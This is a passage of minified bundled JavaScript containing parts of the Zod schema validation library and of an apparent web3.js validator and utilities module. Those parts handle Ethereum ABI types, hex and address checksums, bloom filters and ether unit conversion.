                    common: { ...t.common,
                        issues: []
                    }
                }, r = this._def.innerType._parse({
                    data: n.data,
                    path: n.path,
                    parent: { ...n
                    }
                });
                return Ni(r) ? r.then((e => ({
                    status: "valid",
                    value: "valid" === e.status ? e.value : this._def.catchValue({
                        get error() {
                            return new bi(n.common.issues)
                        },
                        input: n.data
                    })
                }))) : {
                    status: "valid",
                    value: "valid" === r.status ? r.value : this._def.catchValue({
                        get error() {
                            return new bi(n.common.issues)
                        },
                        input: n.data
                    })
                }
            }
            removeCatch() {
                return this._def.innerType
            }
        }
        To.create = (e, t) => new To({
            innerType: e,
            typeName: Lo.ZodCatch,
            catchValue: "function" === typeof t.catch ? t.catch : () => t.catch,
            ...ji(t)
        });
        class Bo extends Fi {
            _parse(e) {
                if (this._getType(e) !== gi.nan) {
                    const t = this._getOrReturnCtx(e);
                    return Ei(t, {
                        code: yi.invalid_type,
                        expected: gi.nan,
                        received: t.parsedType
                    }), Ci
                }
                return {
                    status: "valid",
                    value: e.data
                }
            }
        }
        Bo.create = e => new Bo({
            typeName: Lo.ZodNaN,
            ...ji(e)
        });
        const No = Symbol("zod_brand");
        class Oo extends Fi {
            _parse(e) {
                const {
                    ctx: t
                } = this._processInputParams(e), n = t.data;
                return this._def.type._parse({
                    data: n,
                    path: t.path,
                    parent: t
                })
            }
            unwrap() {
                return this._def.type
            }
        }
        class Ro extends Fi {
            _parse(e) {
                const {
                    status: t,
                    ctx: n
                } = this._processInputParams(e);
                if (n.common.async) {
                    return (async () => {
                        const e = await this._def.in._parseAsync({
                            data: n.data,
                            path: n.path,
                            parent: n
                        });
                        return "aborted" === e.status ? Ci : "dirty" === e.status ? (t.dirty(), _i(e.value)) : this._def.out._parseAsync({
                            data: e.value,
                            path: n.path,
                            parent: n
                        })
                    })()
                } {
                    const e = this._def.in._parseSync({
                        data: n.data,
                        path: n.path,
                        parent: n
                    });
                    return "aborted" === e.status ? Ci : "dirty" === e.status ? (t.dirty(), {
                        status: "dirty",
                        value: e.value
                    }) : this._def.out._parseSync({
                        data: e.value,
                        path: n.path,
                        parent: n
                    })
                }
            }
            static create(e, t) {
                return new Ro({ in: e,
                    out: t,
                    typeName: Lo.ZodPipeline
                })
            }
        }
        class Mo extends Fi {
            _parse(e) {
                const t = this._def.innerType._parse(e);
                return Bi(t) && (t.value = Object.freeze(t.value)), t
            }
        }
        Mo.create = (e, t) => new Mo({
            innerType: e,
            typeName: Lo.ZodReadonly,
            ...ji(t)
        });
        const jo = function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {},
                    n = arguments.length > 2 ? arguments[2] : void 0;
                return e ? no.create().superRefine(((r, i) => {
                    var o, a;
                    if (!e(r)) {
                        const e = "function" === typeof t ? t(r) : "string" === typeof t ? {
                                message: t
                            } : t,
                            s = null === (a = null !== (o = e.fatal) && void 0 !== o ? o : n) || void 0 === a || a,
                            c = "string" === typeof e ? {
                                message: e
                            } : e;
                        i.addIssue({
                            code: "custom",
                            ...c,
                            fatal: s
                        })
                    }
                })) : no.create()
            },
            Fo = {
                object: co.lazycreate
            };
        var Lo;
        ! function(e) {
            e.ZodString = "ZodString", e.ZodNumber = "ZodNumber", e.ZodNaN = "ZodNaN", e.ZodBigInt = "ZodBigInt", e.ZodBoolean = "ZodBoolean", e.ZodDate = "ZodDate", e.ZodSymbol = "ZodSymbol", e.ZodUndefined = "ZodUndefined", e.ZodNull = "ZodNull", e.ZodAny = "ZodAny", e.ZodUnknown = "ZodUnknown", e.ZodNever = "ZodNever", e.ZodVoid = "ZodVoid", e.ZodArray = "ZodArray", e.ZodObject = "ZodObject", e.ZodUnion = "ZodUnion", e.ZodDiscriminatedUnion = "ZodDiscriminatedUnion", e.ZodIntersection = "ZodIntersection", e.ZodTuple = "ZodTuple", e.ZodRecord = "ZodRecord", e.ZodMap = "ZodMap", e.ZodSet = "ZodSet", e.ZodFunction = "ZodFunction", e.ZodLazy = "ZodLazy", e.ZodLiteral = "ZodLiteral", e.ZodEnum = "ZodEnum", e.ZodEffects = "ZodEffects", e.ZodNativeEnum = "ZodNativeEnum", e.ZodOptional = "ZodOptional", e.ZodNullable = "ZodNullable", e.ZodDefault = "ZodDefault", e.ZodCatch = "ZodCatch", e.ZodPromise = "ZodPromise", e.ZodBranded = "ZodBranded", e.ZodPipeline = "ZodPipeline", e.ZodReadonly = "ZodReadonly"
        }(Lo || (Lo = {}));
        const Do = Vi.create,
            Ho = Ki.create,
            Uo = Bo.create,
            zo = Ji.create,
            Go = Yi.create,
            qo = Xi.create,
            Qo = $i.create,
            Wo = eo.create,
            Vo = to.create,
            Zo = no.create,
            Ko = ro.create,
            Jo = io.create,
            Yo = oo.create,
            Xo = ao.create,
            $o = co.create,
            ea = co.strictCreate,
            ta = lo.create,
            na = fo.create,
            ra = po.create,
            ia = mo.create,
            oa = go.create,
            aa = vo.create,
            sa = yo.create,
            ca = bo.create,
            la = wo.create,
            ua = xo.create,
            da = ko.create,
            fa = Eo.create,
            ha = So.create,
            pa = Co.create,
            ma = _o.create,
            ga = Io.create,
            va = Co.createWithPreprocess,
            ya = Ro.create,
            ba = {
                string: e => Vi.create({ ...e,
                    coerce: !0
                }),
                number: e => Ki.create({ ...e,
                    coerce: !0
                }),
                boolean: e => Yi.create({ ...e,
                    coerce: !0
                }),
                bigint: e => Ji.create({ ...e,
                    coerce: !0
                }),
                date: e => Xi.create({ ...e,
                    coerce: !0
                })
            },
            wa = Ci;
        var xa = Object.freeze({
            __proto__: null,
            defaultErrorMap: wi,
            setErrorMap: function(e) {
                xi = e
            },
            getErrorMap: Ai,
            makeIssue: ki,
            EMPTY_PATH: [],
            addIssueToContext: Ei,
            ParseStatus: Si,
            INVALID: Ci,
            DIRTY: _i,
            OK: Ii,
            isAborted: Pi,
            isDirty: Ti,
            isValid: Bi,
            isAsync: Ni,
            get util() {
                return pi
            },
            get objectUtil() {
                return mi
            },
            ZodParsedType: gi,
            getParsedType: vi,
            ZodType: Fi,
            ZodString: Vi,
            ZodNumber: Ki,
            ZodBigInt: Ji,
            ZodBoolean: Yi,
            ZodDate: Xi,
            ZodSymbol: $i,
            ZodUndefined: eo,
            ZodNull: to,
            ZodAny: no,
            ZodUnknown: ro,
            ZodNever: io,
            ZodVoid: oo,
            ZodArray: ao,
            ZodObject: co,
            ZodUnion: lo,
            ZodDiscriminatedUnion: fo,
            ZodIntersection: po,
            ZodTuple: mo,
            ZodRecord: go,
            ZodMap: vo,
            ZodSet: yo,
            ZodFunction: bo,
            ZodLazy: wo,
            ZodLiteral: xo,
            ZodEnum: ko,
            ZodNativeEnum: Eo,
            ZodPromise: So,
            ZodEffects: Co,
            ZodTransformer: Co,
            ZodOptional: _o,
            ZodNullable: Io,
            ZodDefault: Po,
            ZodCatch: To,
            ZodNaN: Bo,
            BRAND: No,
            ZodBranded: Oo,
            ZodPipeline: Ro,
            ZodReadonly: Mo,
            custom: jo,
            Schema: Fi,
            ZodSchema: Fi,
            late: Fo,
            get ZodFirstPartyTypeKind() {
                return Lo
            },
            coerce: ba,
            any: Zo,
            array: Xo,
            bigint: zo,
            boolean: Go,
            date: qo,
            discriminatedUnion: na,
            effect: pa,
            enum: da,
            function: ca,
            instanceof: function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {
                    message: "Input not instance of ".concat(e.name)
                };
                return jo((t => t instanceof e), t)
            },
            intersection: ra,
            lazy: la,
            literal: ua,
            map: aa,
            nan: Uo,
            nativeEnum: fa,
            never: Jo,
            null: Vo,
            nullable: ga,
            number: Ho,
            object: $o,
            oboolean: () => Go().optional(),
            onumber: () => Ho().optional(),
            optional: ma,
            ostring: () => Do().optional(),
            pipeline: ya,
            preprocess: va,
            promise: ha,
            record: oa,
            set: sa,
            strictObject: ea,
            string: Do,
            symbol: Qo,
            transformer: pa,
            tuple: ia,
            undefined: Wo,
            union: ta,
            unknown: Ko,
            void: Yo,
            NEVER: wa,
            ZodIssueCode: yi,
            quotelessJson: e => JSON.stringify(e, null, 2).replace(/"([^"]+)":/g, "$1:"),
            ZodError: bi
        });
        const Aa = e => e.message ? e.message : "unspecified error";
        class ka extends Et {
            constructor(e) {
                super(), this.code = 1100, this.errors = e, super.message = "Web3 validator found ".concat(e.length, " error[s]:\n").concat(this._compileErrors().join("\n"))
            }
            _compileErrors() {
                return this.errors.map(Aa)
            }
        }
        const Ea = ["bool", "int", "uint", "bytes", "string", "address", "tuple"],
            Sa = e => "object" === typeof e && "type" in e && "name" in e,
            Ca = e => "string" === typeof e,
            _a = e => "string" === typeof e && /^((-)?0x[0-9a-f]+|(0x))$/i.test(e);

        function Ia(e, t) {
            return !("string" !== typeof e || !e.match(/^0x[0-9A-Fa-f]*$/)) && !("undefined" !== typeof t && t > 0 && e.length !== 2 + 2 * t)
        }
        const Pa = e => "number" === typeof e || "bigint" === typeof e || "string" === typeof e && /^((-0x|0x|-)?[0-9a-f]+|(0x))$/i.test(e);

        function Ta(e) {
            if ("string" !== typeof e) throw new Error("[isHexPrefixed] input must be type 'string', received type ".concat(typeof e));
            return e.startsWith("0x")
        }
        const Ba = function(e) {
                for (const [t, n] of Object.entries(e))
                    if (void 0 !== n && n.length > 0 && 0 === n[0]) throw new Error("".concat(t, " cannot have leading zeroes, received: ").concat(n.toString()))
            },
            Na = ["hex", "number", "blockNumber", "blockNumberOrTag", "filter", "bloom"],
            Oa = e => {
                let t, n = e.replace(/ /, ""),
                    r = !1,
                    i = [];
                if (e.includes("[") && (n = n.slice(0, n.indexOf("[")), i = [...e.matchAll(/(?:\[(\d*)\])/g)].map((e => parseInt(e[1], 10))).map((e => Number.isNaN(e) ? -1 : e)), r = i.length > 0), Ea.includes(n)) return {
                    baseType: n,
                    isArray: r,
                    baseTypeSize: t,
                    arraySizes: i
                };
                if (n.startsWith("int")) t = parseInt(n.substring(3), 10), n = "int";
                else if (n.startsWith("uint")) t = parseInt(e.substring(4), 10), n = "uint";
                else {
                    if (!n.startsWith("bytes")) return {
                        baseType: void 0,
                        isArray: !1,
                        baseTypeSize: void 0,
                        arraySizes: i
                    };
                    t = parseInt(n.substring(5), 10), n = "bytes"
                }
                return {
                    baseType: n,
                    isArray: r,
                    baseTypeSize: t,
                    arraySizes: i
                }
            },
            Ra = function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                if (Object.keys(t).includes("type")) throw new ka([{
                    keyword: "eth",
                    message: 'Either "eth" or "type" can be presented in schema',
                    params: {
                        eth: e
                    },
                    instancePath: "",
                    schemaPath: ""
                }]);
                const {
                    baseType: n,
                    baseTypeSize: r
                } = Oa(e);
                if (!n && !Na.includes(e)) throw new ka([{
                    keyword: "eth",
                    message: 'Eth data type "'.concat(e, '" is not valid'),
                    params: {
                        eth: e
                    },
                    instancePath: "",
                    schemaPath: ""
                }]);
                if (n) {
                    if ("tuple" === n) throw new Error('"tuple" type is not implemented directly.');
                    return {
                        format: "".concat(n).concat(null !== r && void 0 !== r ? r : ""),
                        required: !0
                    }
                }
                return e ? {
                    format: e,
                    required: !0
                } : {}
            },
            Ma = function(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "/0";
                const n = {
                    type: "array",
                    items: [],
                    maxItems: e.length,
                    minItems: e.length
                };
                for (const [r, i] of e.entries()) {
                    let e, o, a = [];
                    Sa(i) ? (e = i.type, o = i.name || "".concat(t, "/").concat(r), a = i.components) : "string" === typeof i ? (e = i, o = "".concat(t, "/").concat(r)) : Array.isArray(i) && (i[0] && "string" === typeof i[0] && i[0].startsWith("tuple") && !Array.isArray(i[0]) && i[1] && Array.isArray(i[1]) ? (e = i[0], o = "".concat(t, "/").concat(r), a = i[1]) : (e = "tuple", o = "".concat(t, "/").concat(r), a = i));
                    const {
                        baseType: s,
                        isArray: c,
                        arraySizes: l
                    } = Oa(e);
                    let u, d = n;
                    for (let t = l.length - 1; t > 0; t -= 1) u = {
                        type: "array",
                        $id: o,
                        items: [],
                        maxItems: l[t],
                        minItems: l[t]
                    }, l[t] < 0 && (delete u.maxItems, delete u.minItems), Array.isArray(d.items) ? 0 === d.items.length ? d.items = [u] : d.items.push(u) : d.items = [d.items, u], d = u;
                    if ("tuple" !== s || c)
                        if ("tuple" === s && c) {
                            const e = l[0],
                                t = Object.assign({
                                    type: "array",
                                    $id: o,
                                    items: Ma(a, o)
                                }, e >= 0 && {
                                    minItems: e,
                                    maxItems: e
                                });
                            d.items.push(t)
                        } else if (c) {
                        const t = l[0],
                            n = Object.assign({
                                type: "array",
                                $id: o,
                                items: Ra(e)
                            }, t >= 0 && {
                                minItems: t,
                                maxItems: t
                            });
                        d.items.push(n)
                    } else Array.isArray(d.items), d.items.push(Object.assign({
                        $id: o
                    }, Ra(e)));
                    else {
                        const e = Ma(a, o);
                        e.$id = o, d.items.push(e)
                    }
                    d = n
                }
                return n
            },
            ja = e => Ma(e),
            Fa = (e, t) => 1 === t ? e : Fa(e[0], t - 1),
            La = (e, t, n) => {
                const r = [];
                for (const [i, o] of e.entries()) {
                    let e, a, s = [];
                    Sa(o) ? (e = o.type, a = o.name, s = o.components) : "string" === typeof o ? e = o : Array.isArray(o) && (o[1] && Array.isArray(o[1]) ? (e = o[0], s = o[1]) : (e = "tuple", s = o));
                    const {
                        baseType: c,
                        isArray: l,
                        arraySizes: u
                    } = Oa(e), d = Array.isArray(t) ? t[i] : t[a];
                    if ("tuple" !== c || l)
                        if ("tuple" === c && l) {
                            const e = [];
                            for (const t of d)
                                if (u.length > 1) {
                                    const r = Fa(t, u.length - 1),
                                        i = [];
                                    for (const e of r) i.push(La(s, e, n));
                                    e.push(i)
                                } else e.push(La(s, t, n));
                            r.push(e)
                        } else r.push(d);
                    else r.push(La(s, d, n))
                }
                return (n = null !== n && void 0 !== n ? n : []).push(...r), n
            },
            Da = e => {
                if (e >= 48 && e <= 57) return e - 48;
                if (e >= 65 && e <= 70) return e - 55;
                if (e >= 97 && e <= 102) return e - 87;
                throw new Error("Invalid code point: ".concat(e))
            },
            Ha = e => {
                if (!_a(e)) throw new Error("Invalid hex string");
                const [t, n] = e.startsWith("-") ? [!0, e.slice(1)] : [!1, e], r = BigInt(n);
                return r > Number.MAX_SAFE_INTEGER ? t ? -r : r : r < Number.MIN_SAFE_INTEGER ? r : t ? -1 * Number(r) : Number(r)
            },
            Ua = e => {
                if (("number" === typeof e || "bigint" === typeof e) && e < 0) return "-0x".concat(e.toString(16).slice(1));
                if (("number" === typeof e || "bigint" === typeof e) && e >= 0) return "0x".concat(e.toString(16));
                if ("string" === typeof e && _a(e)) {
                    const [t, n] = e.startsWith("-") ? [!0, e.slice(1)] : [!1, e], r = n.split(/^(-)?0(x|X)/).slice(-1)[0];
                    return "".concat(t ? "-" : "", "0x").concat(r.replace(/^0+/, "").toLowerCase())
                }
                if ("string" === typeof e && !_a(e)) return Ua(BigInt(e));
                throw new Wn(e)
            },
            za = function(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "0";
                if ("string" === typeof e && !_a(e)) return e.padStart(t, n);
                const r = "string" === typeof e && _a(e) ? e : Ua(e),
                    [i, o] = r.startsWith("-") ? ["-0x", r.slice(3)] : ["0x", r.slice(2)];
                return "".concat(i).concat(o.padStart(t, n))
            };

        function Ga(e) {
            let t = "0x";
            for (const n of e) {
                const e = n.toString(16);
                t += 1 === e.length ? "0".concat(e) : e
            }
            return t
        }
        const qa = {
            zero: 48,
            nine: 57,
            A: 65,
            F: 70,
            a: 97,
            f: 102
        };

        function Qa(e) {
            return e >= qa.zero && e <= qa.nine ? e - qa.zero : e >= qa.A && e <= qa.F ? e - (qa.A - 10) : e >= qa.a && e <= qa.f ? e - (qa.a - 10) : void 0
        }

        function Wa(e) {
            let t = 0;
            if (!e.startsWith("0") || "x" !== e[1] && "X" !== e[1] || (t = 2), e.length % 2 !== 0) throw new Qn("hex string has odd length: ".concat(e));
            const n = (e.length - t) / 2,
                r = new Uint8Array(n);
            for (let i = 0, o = t; i < n; i += 1) {
                const t = Qa(e.charCodeAt(o++)),
                    n = Qa(e.charCodeAt(o++));
                if (void 0 === t || void 0 === n) throw new Qn('Invalid byte sequence ("'.concat(e[o - 2]).concat(e[o - 1], '" in "').concat(e, '").'));
                r[i] = 16 * t + n
            }
            return r
        }

        function Va(e) {
            var t;
            return e instanceof Uint8Array || "Uint8Array" !== (null === (t = null === e || void 0 === e ? void 0 : e.constructor) || void 0 === t ? void 0 : t.name) ? e : Uint8Array.from(e)
        }
        const Za = e => {
                var t, n;
                return e instanceof Uint8Array || "Uint8Array" === (null === (t = null === e || void 0 === e ? void 0 : e.constructor) || void 0 === t ? void 0 : t.name) || "Buffer" === (null === (n = null === e || void 0 === e ? void 0 : e.constructor) || void 0 === n ? void 0 : n.name)
            },
            Ka = function(e) {
                let t, n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {
                    abiType: "bytes"
                };
                if ("string" !== typeof e && !Array.isArray(e) && !Za(e)) return !1;
                if ("string" === typeof e && _a(e) && e.startsWith("-")) return !1;
                if ("string" === typeof e && !_a(e)) return !1;
                if ("string" === typeof e) {
                    if (e.length % 2 !== 0) return !1;
                    t = Wa(e)
                } else if (Array.isArray(e)) {
                    if (e.some((e => e < 0 || e > 255 || !Number.isInteger(e)))) return !1;
                    t = new Uint8Array(e)
                } else t = e;
                if (null === n || void 0 === n ? void 0 : n.abiType) {
                    const {
                        baseTypeSize: e
                    } = Oa(n.abiType);
                    return !e || t.length === e
                }
                return !(null === n || void 0 === n ? void 0 : n.size) || t.length === (null === n || void 0 === n ? void 0 : n.size)
            },
            Ja = e => {
                if (!/^(0x)?[0-9a-f]{40}$/i.test(e)) return !1;
                const t = e.slice(2),
                    n = Fr(t.toLowerCase()),
                    r = Ga(hi(Va(n))).slice(2);
                for (let i = 0; i < 40; i += 1)
                    if (parseInt(r[i], 16) > 7 && t[i].toUpperCase() !== t[i] || parseInt(r[i], 16) <= 7 && t[i].toLowerCase() !== t[i]) return !1;
                return !0
            },
            Ya = function(e) {
                let t, n = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
                return !("string" !== typeof e && !Za(e)) && (t = Za(e) ? Ga(e) : "string" !== typeof e || _a(e) || e.toLowerCase().startsWith("0x") ? e : "0x".concat(e), !!/^(0x)?[0-9a-f]{40}$/i.test(t) && (!(!/^(0x|0X)?[0-9a-f]{40}$/.test(t) && !/^(0x|0X)?[0-9A-F]{40}$/.test(t)) || (!n || Ja(t))))
            },
            Xa = (e, t) => {
                if (t === BigInt(0)) return BigInt(1);
                let n = e;
                for (let r = 1; r < t; r += 1) n *= e;
                return n
            },
            $a = function(e) {
                let t, n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {
                    abiType: "uint"
                };
                if (!["number", "string", "bigint"].includes(typeof e) || "string" === typeof e && 0 === e.length) return !1;
                if (null === n || void 0 === n ? void 0 : n.abiType) {
                    const {
                        baseTypeSize: e
                    } = Oa(n.abiType);
                    e && (t = e)
                } else n.bitSize && (t = n.bitSize);
                const r = Xa(BigInt(2), BigInt(null !== t && void 0 !== t ? t : 256)) - BigInt(1);
                try {
                    const t = "string" === typeof e && _a(e) ? BigInt(Ha(e)) : BigInt(e);
                    return t >= 0 && t <= r
                } catch (i) {
                    return !1
                }
            },
            es = function(e) {
                let t, n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {
                    abiType: "int"
                };
                if (!["number", "string", "bigint"].includes(typeof e)) return !1;
                if ("number" === typeof e && e > Number.MAX_SAFE_INTEGER) return !1;
                if (null === n || void 0 === n ? void 0 : n.abiType) {
                    const {
                        baseTypeSize: e,
                        baseType: r
                    } = Oa(n.abiType);
                    if ("int" !== r) return !1;
                    e && (t = e)
                } else n.bitSize && (t = n.bitSize);
                const r = Xa(BigInt(2), BigInt((null !== t && void 0 !== t ? t : 256) - 1)),
                    i = BigInt(-1) * Xa(BigInt(2), BigInt((null !== t && void 0 !== t ? t : 256) - 1));
                try {
                    const t = "string" === typeof e && _a(e) ? BigInt(Ha(e)) : BigInt(e);
                    return t >= i && t <= r
                } catch (o) {
                    return !1
                }
            },
            ts = e => !!es(e) || (!("string" !== typeof e || !/[0-9.]/.test(e) || e.indexOf(".") !== e.lastIndexOf(".")) || "number" === typeof e),
            ns = e => $a(e),
            rs = e => Object.values(et).includes(e),
            is = e => rs(e) || ns(e),
            os = e => "string" === typeof e && (!!/^(0x)?[0-9a-f]{512}$/i.test(e) && !(!/^(0x)?[0-9a-f]{512}$/.test(e) && !/^(0x)?[0-9A-F]{512}$/.test(e))),
            as = (e, t) => {
                if ("string" === typeof t && !_a(t)) return !1;
                if (!os(e)) return !1;
                const n = "string" === typeof t ? Wa(t) : t,
                    r = Ga(hi(n)).slice(2);
                for (let i = 0; i < 12; i += 4) {
                    const t = (parseInt(r.slice(i, i + 2), 16) << 8) + parseInt(r.slice(i + 2, i + 4), 16) & 2047,
                        n = 1 << t % 4;
                    if ((Da(e.charCodeAt(e.length - 1 - Math.floor(t / 4))) & n) !== n) return !1
                }
                return !0
            },
            ss = e => void 0 === e || null === e,
            cs = e => "object" === typeof e && !ss(e) && !Array.isArray(e) && !(e instanceof nt),
            ls = e => "string" === typeof e && (!!/^(0x)?[0-9a-f]{64}$/i.test(e) && !(!/^(0x)?[0-9a-f]{64}$/.test(e) && !/^(0x)?[0-9A-F]{64}$/.test(e))),
            us = {
                address: e => Ya(e),
                bloom: e => os(e),
                blockNumber: e => ns(e),
                blockTag: e => rs(e),
                blockNumberOrTag: e => is(e),
                bool: e => {
                    return !!["number", "string", "boolean"].includes(typeof(t = e)) && ("boolean" === typeof t || ("string" !== typeof t || _a(t) ? "string" === typeof t && _a(t) ? "0x1" === t || "0x0" === t : 1 === t || 0 === t : "1" === t || "0" === t));
                    var t
                },
                bytes: e => Ka(e),
                filter: e => (e => {
                    const t = ["fromBlock", "toBlock", "address", "topics", "blockHash"];
                    if (ss(e) || "object" !== typeof e) return !1;
                    if (!Object.keys(e).every((e => t.includes(e)))) return !1;
                    if (!ss(e.fromBlock) && !is(e.fromBlock) || !ss(e.toBlock) && !is(e.toBlock)) return !1;
                    if (!ss(e.address))
                        if (Array.isArray(e.address)) {
                            if (!e.address.every((e => Ya(e)))) return !1
                        } else if (!Ya(e.address)) return !1;
                    return !(!ss(e.topics) && !e.topics.every((e => !!ss(e) || (Array.isArray(e) ? e.every((e => ls(e))) : !!ls(e)))))
                })(e),
                hex: e => _a(e),
                uint: e => $a(e),
                int: e => es(e),
                number: e => ts(e),
                string: e => Ca(e)
            };
        for (let n = 8; n <= 256; n += 8) us["int".concat(n)] = e => es(e, {
            bitSize: n
        }), us["uint".concat(n)] = e => $a(e, {
            bitSize: n
        });
        for (let n = 1; n <= 32; n += 1) us["bytes".concat(n)] = e => Ka(e, {
            size: n
        });
        us.bytes256 = us.bytes;
        const ds = us,
            fs = e => {
                if ((!(null === e || void 0 === e ? void 0 : e.type) || "object" === (null === e || void 0 === e ? void 0 : e.type)) && (null === e || void 0 === e ? void 0 : e.properties)) {
                    const t = {};
                    for (const n of Object.keys(e.properties)) {
                        const r = fs(e.properties[n]);
                        r && (t[n] = r)
                    }
                    return Array.isArray(e.required) ? xa.object(t).partial().required(e.required.reduce(((e, t) => Object.assign(Object.assign({}, e), {
                        [t]: !0
                    })), {})) : xa.object(t).partial()
                }
                if ("array" === (null === e || void 0 === e ? void 0 : e.type) && (null === e || void 0 === e ? void 0 : e.items)) {
                    if (Array.isArray(e.items) && e.items.length > 1 && void 0 !== e.maxItems && new Set(e.items.map((e => e.$id))).size === e.items.length) {
                        const t = [];
                        for (const n of e.items) {
                            const e = fs(n);
                            e && t.push(e)
                        }
                        return xa.tuple(t)
                    }
                    const t = Array.isArray(e.items) ? e.items[0] : e.items;
                    let n = xa.array(fs(t));
                    return n = void 0 !== e.minItems ? n.min(e.minItems) : n, n = void 0 !== e.maxItems ? n.max(e.maxItems) : n, n
                }
                if (e.oneOf && Array.isArray(e.oneOf)) return xa.union(e.oneOf.map((e => fs(e))));
                if (null === e || void 0 === e ? void 0 : e.format) {
                    if (!ds[e.format]) throw new pr(e.format);
                    return xa.any().refine(ds[e.format], (t => ({
                        params: {
                            value: t,
                            format: e.format
                        }
                    })))
                }
                return (null === e || void 0 === e ? void 0 : e.type) && "object" !== (null === e || void 0 === e ? void 0 : e.type) && "function" === typeof xa[String(e.type)] ? xa[String(e.type)]() : xa.object({
                    data: xa.any()
                }).partial()
            };
        class hs {
            static factory() {
                return hs.validatorInstance || (hs.validatorInstance = new hs), hs.validatorInstance
            }
            validate(e, t, n) {
                var r, i;
                const o = fs(e).safeParse(t);
                if (!o.success) {
                    const e = this.convertErrors(null !== (i = null === (r = o.error) || void 0 === r ? void 0 : r.issues) && void 0 !== i ? i : []);
                    if (e) {
                        if (null === n || void 0 === n ? void 0 : n.silent) return e;
                        throw new ka(e)
                    }
                }
            }
            convertErrors(e) {
                if (e && Array.isArray(e) && e.length > 0) return e.map((e => {
                    var t;
                    let n, r, i, o;
                    o = e.path.join("/");
                    const a = String(e.path[e.path.length - 1]),
                        s = e.path.join("/");
                    if (e.code === yi.too_big) r = "maxItems", o = "".concat(s, "/maxItems"), i = {
                        limit: e.maximum
                    }, n = "must NOT have more than ".concat(e.maximum, " items");
                    else if (e.code === yi.too_small) r = "minItems", o = "".concat(s, "/minItems"), i = {
                        limit: e.minimum
                    }, n = "must NOT have fewer than ".concat(e.minimum, " items");
                    else if (e.code === yi.custom) {
                        const {
                            value: r,
                            format: a
                        } = null !== (t = e.params) && void 0 !== t ? t : {};
                        n = "undefined" === typeof r ? 'value at "/'.concat(o, '" is required') : 'value "'.concat("object" === typeof r ? JSON.stringify(r) : r, '" at "/').concat(o, '" must pass "').concat(a, '" validation'), i = {
                            value: r
                        }
                    }
                    return {
                        keyword: null !== r && void 0 !== r ? r : a,
                        instancePath: s ? "/".concat(s) : "",
                        schemaPath: o ? "#".concat(o) : "#",
                        params: null !== i && void 0 !== i ? i : {
                            value: e.message
                        },
                        message: null !== n && void 0 !== n ? n : e.message
                    }
                }))
            }
        }
        const ps = new class {
            constructor() {
                this._validator = hs.factory()
            }
            validateJSONSchema(e, t, n) {
                return this._validator.validate(e, t, n)
            }
            validate(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {
                    silent: !1
                };
                var r, i;
                const o = ja(e);
                if (!Array.isArray(o.items) || 0 !== (null === (r = o.items) || void 0 === r ? void 0 : r.length) || 0 !== t.length) {
                    if (Array.isArray(o.items) && 0 === (null === (i = o.items) || void 0 === i ? void 0 : i.length) && 0 !== t.length) throw new ka([{
                        instancePath: "/0",
                        schemaPath: "/",
                        keyword: "required",
                        message: "empty schema against data can not be validated",
                        params: t
                    }]);
                    return this._validator.validate(o, t, n)
                }
            }
        };

        function ms(e) {
            var t, n;
            return e instanceof Uint8Array || "Uint8Array" === (null === (t = null === e || void 0 === e ? void 0 : e.constructor) || void 0 === t ? void 0 : t.name) || "Buffer" === (null === (n = null === e || void 0 === e ? void 0 : e.constructor) || void 0 === n ? void 0 : n.name)
        }

        function gs() {
            for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++) t[n] = arguments[n];
            const r = t.reduce(((e, t) => e + t.length), 0),
                i = new Uint8Array(r);
            let o = 0;
            for (const a of t) i.set(a, o), o += a.length;
            return i
        }

        function vs(e, t) {
            if (e === t) return !0;
            if (e.byteLength !== t.byteLength) return !1;
            for (let n = 0; n < e.byteLength; n += 1)
                if (e[n] !== t[n]) return !1;
            return !0
        }
        const ys = {
                noether: BigInt(0),
                wei: BigInt(1),
                kwei: BigInt(1e3),
                Kwei: BigInt(1e3),
                babbage: BigInt(1e3),
                femtoether: BigInt(1e3),
                mwei: BigInt(1e6),
                Mwei: BigInt(1e6),
                lovelace: BigInt(1e6),
                picoether: BigInt(1e6),
                gwei: BigInt(1e9),
                Gwei: BigInt(1e9),
                shannon: BigInt(1e9),
                nanoether: BigInt(1e9),
                nano: BigInt(1e9),
                szabo: BigInt(1e12),
                microether: BigInt(1e12),
                micro: BigInt(1e12),
                finney: BigInt(1e15),
                milliether: BigInt(1e15),
                milli: BigInt(1e15),
                ether: BigInt("1000000000000000000"),
                kether: BigInt("1000000000000000000000"),
                grand: BigInt("1000000000000000000000"),
                mether: BigInt("1000000000000000000000000"),
                gether: BigInt("1000000000000000000000000000"),
                tether: BigInt("1000000000000000000000000000000")
            },
            bs = "Warning: Using type `number` with values that are large or contain many decimals may cause loss of precision, it is recommended to use type `string` or `BigInt` when using conversion methods",
            ws = e => {
                if (ps.validate(["bytes"], [e]), ms(e)) return e;
                if (Array.isArray(e)) return new Uint8Array(e);
                if ("string" === typeof e) return Wa(e);
                throw new Qn(e)
            },
            {
                uint8ArrayToHexString: xs
            } = e,
            As = e => xs(ws(e)),
            ks = e => "string" === typeof e && "0x" !== e.slice(0, 2).toLowerCase() ? ws("0x".concat(e)) : ws(e),
            Es = e => (ps.validate(["hex"], [e]), Ha(e)),
            Ss = Es,
            Cs = (e, t) => {
                "bigint" !== typeof e && ps.validate(["int"], [e]);
                let n = Ua(e);
                return t && (n.startsWith("-") || n.length % 2 !== 1 ? n.length % 2 === 0 && n.startsWith("-") && (n = "-0x0".concat(n.slice(3))) : n = "0x0".concat(n.slice(2))), n
            },
            _s = Cs,
            Is = e => Es(e).toString(),
            Ps = e => {
                ps.validate(["string"], [e]);
                let t = e.replace(/^(?:\u0000)/, "");
                return t = t.replace(/(?:\u0000)$/, ""), As((new TextEncoder).encode(t))
            },
            Ts = Ps,
            Bs = Ps,
            Ns = e => di(ks(e)),
            Os = e => "string" === typeof e ? Ns(e) : (ps.validate(["bytes"], [e]), di(e)),
